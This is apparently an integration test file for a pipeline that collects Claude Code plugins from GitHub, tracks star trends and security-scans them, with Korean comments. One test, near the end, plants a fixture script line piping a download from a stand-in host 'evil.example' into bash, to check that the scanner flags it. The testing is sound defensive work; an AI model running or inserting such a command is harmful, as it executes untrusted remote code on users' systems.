// 수집 파이프라인 통합 테스트 IT-1~IT-9. GitHub·FastAPI는 가짜, DB는 Testcontainers(운영과 같은 권한·마이그레이션).
import request from 'supertest';
import { RateLimitPausedError } from '../src/github/github.types';
import { RULE_SET_VERSION } from '../src/security/engine';
import { dailyGains } from '../src/trending/algo/gains';
import {
  createTestApp,
  createUser,
  login,
  resetDb,
  type TestApp,
} from './support/app';
import { FakeGithub, officialHistory, sha } from './support/fake-github';
import { createIngestApp, type IngestApp } from './support/ingest-app';
import { D1, D2, LINT_DANGER, SKILL, world } from './support/world';

/** 가짜 세계의 저장소를 DB에 TRACKED로 직접 심는다(단계를 건너뛰고 특정 단계만 검증할 때). */
async function seedTracked(app: IngestApp, onlyOwner?: string) {
  for (const r of app.github.repos.values()) {
    if (onlyOwner && r.owner !== onlyOwner) continue;
    await app.prisma.repo.create({
      data: {
        githubId: BigInt(r.id),
        nodeId: r.nodeId,
        owner: r.owner,
        name: r.name,
        fullNameLower: `${r.owner}/${r.name}`.toLowerCase(),
        discoveredVia: 'MANUAL',
        status: 'TRACKED',
        stars: r.stars,
        ghCreatedAt: new Date(r.createdAt ?? '2025-01-01'),
      },
    });
  }
}

const day = (d: string) => new Date(`${d}T00:00:00Z`);

describe('수집 파이프라인 통합', () => {
  let app: IngestApp;
  let gh: FakeGithub;

  async function counts() {
    const p = app.prisma;
    return {
      repo: await p.repo.count(),
      item: await p.item.count(),
      marketplace: await p.marketplace.count(),
      entry: await p.marketplaceEntry.count(),
      doc: await p.itemSourceDoc.count(),
      starDay: await p.repoStarDay.count(),
      trend: await p.trendScore.count(),
      scan: await p.securityScan.count(),
      finding: await p.securityFinding.count(),
      issue: await p.dataQualityIssue.count(),
    };
  }
  /** 같은 as_of를 새 MANUAL run으로 다시 돌린다(CRON run은 DONE 단계를 건너뛰므로 진짜 재실행이 아니다). */
  async function rerunManual(asOf: string, stages: string[] = []) {
    const run = await app.prisma.ingestionRun.create({
      data: { trigger: 'MANUAL', asOf: day(asOf), stages: stages as never },
    });
    return app.pipeline.ingest({ asOf, runId: run.id });
  }
  const stageRow = (runId: number, stage: string) =>
    app.prisma.ingestionStage.findUniqueOrThrow({
      where: { runId_stage: { runId, stage: stage as never } },
    });

  beforeEach(async () => {
    gh = world();
    app = await createIngestApp(gh);
    await resetDb(app.prisma);
  });
  afterEach(() => app.close());

  it('전 단계 완주: 후보 → 판별 → 스냅샷 → 이력 → 원문 → 검사 → 동기화 → 트렌딩 → 품질', async () => {
    const out = await app.pipeline.ingest({ asOf: D1 });
    expect(out).toMatchObject({ skipped: false, status: 'SUCCEEDED' });
    if (out.skipped) return;

    const repos = await app.prisma.repo.findMany({ orderBy: { id: 'asc' } });
    expect(
      Object.fromEntries(repos.map((r) => [r.fullNameLower, r.status])),
    ).toEqual({
      'a/hook-lint': 'TRACKED',
      'b/market': 'TRACKED',
      'c/ext': 'TRACKED', // 마켓플레이스 참조로 Candidate가 됐고 증거가 있어 승격
      'd/nothing': 'IGNORED',
    });
    expect(repos.find((r) => r.name === 'ext')!.discoveredVia).toBe(
      'MARKETPLACE_REF',
    );
    expect(repos.find((r) => r.name === 'hook-lint')!.headSha).toBe(sha('1'));

    // 9단계 모두 DONE, 통계에 GitHub 사용량이 남는다
    const stages = await app.prisma.ingestionStage.findMany({
      where: { runId: out.runId },
    });
    expect(stages).toHaveLength(9);
    expect(stages.every((s) => s.status === 'DONE')).toBe(true);
    const total = stages.reduce(
      (n, s) => n + ((s.stats as { ghCoreUsed?: number }).ghCoreUsed ?? 0),
      0,
    );
    expect(total).toBe(gh.usage().core);
    expect(app.aiCalls.length).toBeGreaterThan(0);

    // 트렌딩: 비정규화·스파크라인·순위
    const d7 = await app.prisma.trendScore.findMany({
      where: { window: 'D7', asOf: day(D1) },
      orderBy: { rank: 'asc' },
      include: { repo: true },
    });
    expect(d7.map((t) => t.repo.name)).toEqual(['hook-lint', 'market', 'ext']);
    expect(d7.map((t) => t.rank)).toEqual([1, 2, 3]);
    const hookItem = await app.prisma.item.findFirstOrThrow({
      where: { repo: { name: 'hook-lint' } },
    });
    expect(hookItem).toMatchObject({
      trendRank7d: 1,
      prevTrendRank7d: null,
      repoStars: 50,
    });
    expect(hookItem.trendScore7d).toBeGreaterThan(0);
    const spark = (
      await app.prisma.repo.findFirstOrThrow({ where: { name: 'hook-lint' } })
    ).sparkline7d as (number | null)[];
    expect(spark).toHaveLength(7);
    expect(spark[6]).toBeNull(); // 오늘: 전일 스냅샷도 공식 기록도 없음 → 모름(0 아님)
    expect(spark.slice(0, 6)).toEqual([8, 7, 6, 5, 4, 3]); // 오래된 날 → 어제
  });

  it('IT-1: 같은 as_of로 다시 돌려도(새 run, 모든 단계 재실행) 행 수가 같다', async () => {
    await app.pipeline.ingest({ asOf: D1 });
    const before = await counts();
    expect(before.item).toBeGreaterThan(0);
    const again = await rerunManual(D1);
    expect(again).toMatchObject({ skipped: false, status: 'SUCCEEDED' });
    expect(await counts()).toEqual(before);
  });

  it('IT-2: snapshot 2묶음 처리 후 예외 → 재실행은 커서부터 재개, 중복 0', async () => {
    for (let i = 0; i < 250; i++)
      gh.add({
        owner: 'bulk',
        name: `r${i}`,
        stars: 10 + i,
        head: sha('5'),
        files: {},
      });
    await seedTracked(app, 'bulk');
    gh.hook = (m, n) => {
      if (m === 'snapshots' && n === 3) throw new Error('boom');
    };

    const first = await app.pipeline.ingest({ asOf: D1, stages: ['SNAPSHOT'] });
    if (first.skipped) throw new Error('unexpected');
    const row = await stageRow(first.runId, 'SNAPSHOT');
    expect(row.status).toBe('FAILED');
    expect(await app.prisma.repoStarDay.count()).toBe(200);
    const lastId = (
      await app.prisma.repo.findMany({
        orderBy: { id: 'asc' },
        skip: 199,
        take: 1,
      })
    )[0].id;
    expect(row.cursor).toEqual({ lastRepoId: lastId });

    gh.hook = undefined;
    const callsBefore = gh.calls.snapshots;
    const second = await app.pipeline.ingest({
      asOf: D1,
      stages: ['SNAPSHOT'],
    });
    if (second.skipped) throw new Error('unexpected');
    expect(second.runId).toBe(first.runId);
    expect((await stageRow(first.runId, 'SNAPSHOT')).status).toBe('DONE');
    expect(gh.calls.snapshots - callsBefore).toBe(1); // 남은 1묶음만 처리
    expect(await app.prisma.repoStarDay.count()).toBe(250);
  });

  it('IT-3: 동시에 두 번 시작하면 하나만 진행하고 다른 쪽은 건너뛴다', async () => {
    let release!: () => void;
    let entered!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    const inside = new Promise<void>((r) => (entered = r));
    gh.hook = async (m) => {
      if (m === 'searchRepositories') {
        entered();
        await gate;
      }
    };
    const first = app.pipeline.ingest({ asOf: D1 });
    await inside;
    expect(await app.pipeline.ingest({ asOf: D1 })).toEqual({ skipped: true });
    release();
    expect(await first).toMatchObject({ skipped: false, status: 'SUCCEEDED' });
  });

  it('IT-4: 레이트리밋 예비분 도달 → 단계 PAUSED + 커서 저장, 다음 단계 계속, 다음 실행이 이어감', async () => {
    gh.hook = (m, n) => {
      if (m === 'getTree' && n >= 2) throw new RateLimitPausedError();
    };
    const first = await app.pipeline.ingest({ asOf: D1 });
    if (first.skipped) throw new Error('unexpected');
    expect(first.status).toBe('PARTIAL');
    const q = await stageRow(first.runId, 'QUALIFY');
    expect(q.status).toBe('PAUSED');
    expect(q.cursor).not.toBeNull();
    expect((await stageRow(first.runId, 'DISCOVER')).status).toBe('DONE');
    expect((await stageRow(first.runId, 'SNAPSHOT')).status).toBe('DONE'); // 다음 단계는 계속 진행
    expect(
      await app.prisma.repo.count({ where: { status: 'CANDIDATE' } }),
    ).toBeGreaterThan(0);

    gh.hook = undefined;
    const second = await app.pipeline.ingest({ asOf: D1 });
    expect(second).toMatchObject({
      skipped: false,
      runId: first.runId,
      status: 'SUCCEEDED',
    });
    expect(
      await app.prisma.repo.count({ where: { status: 'CANDIDATE' } }),
    ).toBe(0);
    expect(await app.prisma.repo.count({ where: { status: 'TRACKED' } })).toBe(
      3,
    );
  });

  it('IT-5: 마켓플레이스 상대경로·github·npm·command 혼합 → Item·Candidate·UNSUPPORTED·R14', async () => {
    await app.pipeline.ingest({ asOf: D1 });
    const items = await app.prisma.item.findMany({
      include: { repo: true, currentScan: { include: { findings: true } } },
      orderBy: { id: 'asc' },
    });
    const brief = items
      .map((i) => `${i.repo.name}:${i.kind}:${i.path}:${i.sourceType}`)
      .sort();
    expect(brief).toEqual([
      'ext:PLUGIN::IN_REPO', // 마켓플레이스가 먼저 GITHUB_REPO로 만들었지만 ext 자신의 판별이 정본
      'hook-lint:HOOK::IN_REPO',
      'market:PLUGIN:entry:cmd:UNSUPPORTED',
      'market:PLUGIN:entry:npmpkg:UNSUPPORTED',
      'market:PLUGIN:plugins/rel:IN_REPO',
    ]);
    const by = (path: string, repo: string) =>
      items.find((i) => i.path === path && i.repo.name === repo)!;
    // command 소스: 분석 불가가 아니라 R14 신호가 있는 ANALYZED. 명령 자체가 `curl | sh`라 R01도 걸려 DANGER
    const cmd = by('entry:cmd', 'market');
    expect(cmd.currentScan).toMatchObject({
      status: 'ANALYZED',
      level: 'DANGER',
    });
    expect(cmd.currentScan!.findings.map((f) => f.ruleId).sort()).toEqual([
      'R01_REMOTE_PIPE_EXEC',
      'R14_MARKETPLACE_COMMAND_SOURCE',
    ]);
    // npm 소스: 분석 불가, 등급 없음
    const npm = by('entry:npmpkg', 'market');
    expect(npm.currentScan).toMatchObject({
      status: 'UNSUPPORTED',
      level: null,
    });
    expect(npm.currentLevel).toBeNull();
    // 정상 플러그인 SAFE, R11이 걸린 스킬 포함 플러그인 CAUTION, 원격 파이프 훅 DANGER
    expect(by('plugins/rel', 'market').currentLevel).toBe('SAFE');
    expect(by('', 'ext').currentLevel).toBe('CAUTION');
    expect(by('', 'hook-lint').currentLevel).toBe('DANGER');
    expect(
      by('', 'hook-lint').currentScan!.findings.map((f) => f.ruleId),
    ).toContain('R01_REMOTE_PIPE_EXEC');
    // 마켓플레이스 등록·구성 요소 집계
    expect(await app.prisma.marketplaceEntry.count()).toBe(4);
    expect(by('plugins/rel', 'market')).toMatchObject({
      name: 'rel',
      components: { skills: 1 },
    });
    // 원문(Source Doc): README가 있는 항목만(ext는 README가 없어 요약 대상 없음)
    expect(await app.prisma.itemSourceDoc.count()).toBe(2);
  });

  it('IT-6: headSha 불변 재실행 → fetch-content·scan 외부 호출 0, 검사 행 불변', async () => {
    await app.pipeline.ingest({ asOf: D1 });
    const scans = await app.prisma.securityScan.count();
    const callsBefore = gh.total();
    const out = await app.pipeline.ingest({
      asOf: D2,
      stages: ['FETCH_CONTENT', 'SECURITY_SCAN'],
    });
    expect(out).toMatchObject({ skipped: false, status: 'SUCCEEDED' });
    expect(gh.total()).toBe(callsBefore);
    expect(await app.prisma.securityScan.count()).toBe(scans);
  });

  it('REVIEW B4: README에 NUL이 있어도 저장되고(NUL 제거), 한 저장소의 예외는 failure 1건으로 격리되어 단계가 DONE', async () => {
    gh.repo('a/hook-lint').files['README.md'] =
      `# hook-lint\0${'x'.repeat(200)}`;
    const out = await app.pipeline.ingest({ asOf: D1 });
    expect(out).toMatchObject({ skipped: false, status: 'SUCCEEDED' });
    const doc = await app.prisma.itemSourceDoc.findFirstOrThrow({
      where: { item: { repo: { name: 'hook-lint' } } },
    });
    expect(doc.content).not.toContain('\0');
    expect(await app.prisma.ingestionFailure.count()).toBe(0);
  });

  it('REVIEW B4: GithubError가 아닌 예외도 저장소 단위로 격리(QUALIFY·FETCH_CONTENT 단계가 FAILED가 되지 않음)', async () => {
    // 실패율 20% 규칙(1/4 = 25%)에 걸리지 않도록 정상 저장소를 늘린다
    for (const n of ['f1', 'f2', 'f3', 'f4', 'f5'])
      gh.add({
        owner: 'f',
        name: n,
        stars: 10,
        head: sha('7'),
        topics: ['claude-code'],
        files: { 'skills/x/SKILL.md': SKILL() },
      });
    const real = gh.getTree.bind(gh);
    gh.getTree = async (owner, repo) => {
      if (repo === 'hook-lint') throw new Error('invalid byte sequence');
      return real(owner, repo);
    };
    const out = await app.pipeline.ingest({ asOf: D1 });
    if (out.skipped) throw new Error('skipped');
    const stage = (name: string) => stageRow(out.runId, name);
    expect((await stage('QUALIFY')).status).toBe('DONE');
    expect((await stage('FETCH_CONTENT')).status).toBe('DONE');
    const failures = await app.prisma.ingestionFailure.findMany({
      where: { stage: 'QUALIFY' },
    });
    expect(failures).toHaveLength(1);
    expect(
      (await app.prisma.repo.findFirstOrThrow({ where: { name: 'market' } }))
        .status,
    ).toBe('TRACKED');
  });

  it('REVIEW Y5: 강제 종료로 RUNNING에 남은 이전 run은 락을 잡은 다음 실행이 FAILED로 정리한다', async () => {
    const stale = await app.prisma.ingestionRun.create({
      data: {
        trigger: 'CRON',
        asOf: day('2026-11-20'),
        cronKey: '2026-11-20',
        status: 'RUNNING',
        startedAt: new Date(Date.now() - 6 * 3_600_000),
      },
    });
    const out = await app.pipeline.ingest({ asOf: D1 });
    expect(out).toMatchObject({ skipped: false });
    const after = await app.prisma.ingestionRun.findUniqueOrThrow({
      where: { id: stale.id },
    });
    expect(after.status).toBe('FAILED');
    expect(after.finishedAt).not.toBeNull();
  });

  it('IT-7: 신규 저장소 공식 기록 실패 + 전일 스냅샷 없음 → gain null · 트렌드 없음 · OFFICIAL_HISTORY_FAILED 1건', async () => {
    gh.add({
      owner: 'e',
      name: 'fresh',
      stars: 40,
      head: sha('6'),
      topics: ['claude-code'],
      createdAt: '2026-11-20T00:00:00Z',
      history: 'fail',
      files: { 'skills/s/SKILL.md': SKILL() },
    });
    await app.pipeline.ingest({ asOf: D1 });
    const e = await app.prisma.repo.findFirstOrThrow({
      where: { name: 'fresh' },
    });
    const rows = await app.prisma.repoStarDay.findMany({
      where: { repoId: e.id },
    });
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ snapshotTotal: 40, officialAdded: null });
    const gains = dailyGains(
      rows.map((r) => ({
        day: r.day.toISOString().slice(0, 10),
        snapshotTotal: r.snapshotTotal,
        officialAdded: r.officialAdded,
      })),
      '2026-11-20',
      D1,
    );
    expect(gains.every((g) => g === null)).toBe(true); // 누적 40을 하루치로 계산하지 않는다
    expect(await app.prisma.trendScore.count({ where: { repoId: e.id } })).toBe(
      0,
    );
    const issues = () =>
      app.prisma.dataQualityIssue.count({
        where: { kind: 'OFFICIAL_HISTORY_FAILED', repoId: e.id },
      });
    expect(await issues()).toBe(1);
    await rerunManual(D1);
    expect(await issues()).toBe(1);
  });

  it('IT-8: 스냅샷 vs 공식 불일치 → 이슈 1건, 같은 날 재실행해도 중복 없음', async () => {
    gh.add({
      owner: 'f',
      name: 'mismatch',
      stars: 100,
      head: sha('7'),
      createdAt: '2020-01-01T00:00:00Z',
      files: {},
      history: officialHistory(D1, Array<number>(8).fill(20)),
    });
    await seedTracked(app, 'f');
    const f = await app.prisma.repo.findFirstOrThrow({
      where: { name: 'mismatch' },
    });
    // 과거 스냅샷: 하루 +1씩(공식은 하루 +20) — 완결일 7일 구간의 차분에 전전날까지 필요
    for (let i = 1; i <= 8; i++) {
      const d = new Date(day(D1).getTime() - i * 86_400_000);
      await app.prisma.repoStarDay.create({
        data: { repoId: f.id, day: d, snapshotTotal: 100 - i },
      });
    }
    const stages = ['SNAPSHOT', 'STAR_HISTORY', 'QUALITY'];
    await app.pipeline.ingest({ asOf: D1, stages: stages as never });
    const mismatch = () =>
      app.prisma.dataQualityIssue.findMany({
        where: { kind: 'STAR_SOURCE_MISMATCH', repoId: f.id },
      });
    expect(await mismatch()).toHaveLength(1);
    const total = await app.prisma.dataQualityIssue.count();
    await rerunManual(D1, stages);
    expect(await mismatch()).toHaveLength(1);
    expect(await app.prisma.dataQualityIssue.count()).toBe(total);
  });

  it('트렌딩 2일차: 전일 순위·D1 점수가 생기고 같은 날 재실행은 순위가 같다', async () => {
    await app.pipeline.ingest({ asOf: D1 });
    gh.repo('a/hook-lint').stars += 6; // 하루 +6 → D1 자격(≥3)
    await app.pipeline.ingest({ asOf: D2 });
    const hook = await app.prisma.repo.findFirstOrThrow({
      where: { name: 'hook-lint' },
    });
    const d7 = await app.prisma.trendScore.findUniqueOrThrow({
      where: {
        window_asOf_repoId: { window: 'D7', asOf: day(D2), repoId: hook.id },
      },
    });
    expect(d7.prevRank).toBe(1);
    expect(
      await app.prisma.trendScore.count({
        where: { window: 'D1', asOf: day(D2), repoId: hook.id },
      }),
    ).toBe(1);
    const item = await app.prisma.item.findFirstOrThrow({
      where: { repoId: hook.id },
    });
    expect(item.prevTrendRank7d).toBe(1);
    const before = await app.prisma.trendScore.count();
    await rerunManual(D2, ['TRENDING']);
    expect(await app.prisma.trendScore.count()).toBe(before);
  });

  describe('IT-9 Override 수명주기', () => {
    let http: TestApp;
    beforeEach(async () => {
      http = await createTestApp();
    });
    afterEach(() => http.app.close());

    it('생성 → 규칙 버전 재검사에도 유지 → 줄 위치만 바뀌어도 유지 → 매칭 줄이 바뀌면 신호 재노출', async () => {
      await app.pipeline.ingest({ asOf: D1 });
      const item = await app.prisma.item.findFirstOrThrow({
        where: { repo: { name: 'hook-lint' } },
        include: { currentScan: { include: { findings: true } } },
      });
      expect(item.currentLevel).toBe('DANGER');
      const finding = item.currentScan!.findings.find(
        (f) => f.ruleId === 'R01_REMOTE_PIPE_EXEC',
      )!;

      const admin = await createUser(app.prisma, {
        email: 'ops@example.com',
        role: 'ADMIN',
      });
      const user = await createUser(app.prisma, { email: 'u@example.com' });
      await app.prisma.bookmark.create({
        data: { userId: user.id, itemId: item.id, seenLevel: 'DANGER' },
      });

      // ① Override 생성 → 등급 즉시 재계산, 북마크 "등급 변경" 탭에 노출
      await app.security.createOverride(admin.id, {
        itemId: item.id,
        fingerprint: finding.fingerprint,
        reason: '내부 미러 주소라 허용함',
      });
      const levelAfter = (
        await app.prisma.item.findUniqueOrThrow({ where: { id: item.id } })
      ).currentLevel;
      expect(levelAfter).toBe('SAFE');
      const tab = async () => {
        const res = await request(http.http())
          .get('/api/me/bookmarks/security-changes')
          .set({
            Authorization: `Bearer ${await login(http, 'u@example.com')}`,
          })
          .expect(200);
        return (
          res.body as {
            items: { item: { id: number }; currentLevel: string }[];
          }
        ).items;
      };
      expect(await tab()).toMatchObject([
        { item: { id: item.id }, currentLevel: 'SAFE' },
      ]);

      // ② 규칙셋 버전이 달라져 전부 재검사되어도 같은 지문이라 예외가 유지된다
      await app.prisma.securityScan.updateMany({
        data: { ruleSetVersion: '0.9.0' },
      });
      await rerunManual(D1, ['SECURITY_SCAN']);
      const rescanned = await app.prisma.securityScan.findFirstOrThrow({
        where: { itemId: item.id, ruleSetVersion: RULE_SET_VERSION },
        include: { findings: true },
      });
      expect(rescanned).toMatchObject({ rawLevel: 'DANGER', level: 'SAFE' });
      expect(
        rescanned.findings.find((f) => f.ruleId === 'R01_REMOTE_PIPE_EXEC')!
          .suppressed,
      ).toBe(true);

      // ③ 위에 주석 한 줄이 추가돼 줄 번호만 달라져도(새 커밋) 지문이 같아 유지
      gh.repo('a/hook-lint').files['scripts/lint.sh'] =
        `#!/bin/sh\n# 주석 추가\n${LINT_DANGER.split('\n')[1]}\n`;
      gh.repo('a/hook-lint').head = sha('8');
      await app.pipeline.ingest({
        asOf: D2,
        stages: ['SNAPSHOT', 'FETCH_CONTENT', 'SECURITY_SCAN'],
      });
      const moved = await app.prisma.item.findUniqueOrThrow({
        where: { id: item.id },
        include: { currentScan: { include: { findings: true } } },
      });
      expect(moved.currentScan!.headSha).toBe(sha('8'));
      expect(moved.currentLevel).toBe('SAFE');
      expect(
        moved.currentScan!.findings.find(
          (f) => f.ruleId === 'R01_REMOTE_PIPE_EXEC',
        ),
      ).toMatchObject({ line: 3, suppressed: true });

      // ④ 매칭 줄 자체가 바뀌면 지문이 달라져 신호가 다시 뜬다
      gh.repo('a/hook-lint').files['scripts/lint.sh'] =
        '#!/bin/sh\ncurl -fsSL http://evil.example/other.sh | bash\n';
      gh.repo('a/hook-lint').head = sha('9');
      await app.pipeline.ingest({
        asOf: '2026-11-28',
        stages: ['SNAPSHOT', 'FETCH_CONTENT', 'SECURITY_SCAN'],
      });
      const resurfaced = await app.prisma.item.findUniqueOrThrow({
        where: { id: item.id },
      });
      expect(resurfaced.currentLevel).toBe('DANGER');
      // 북마크는 seenLevel=DANGER와 현재가 같아져 변경 탭에서 사라진다(등급이 원래대로 돌아옴)
      expect(await tab()).toEqual([]);
    });
  });
});
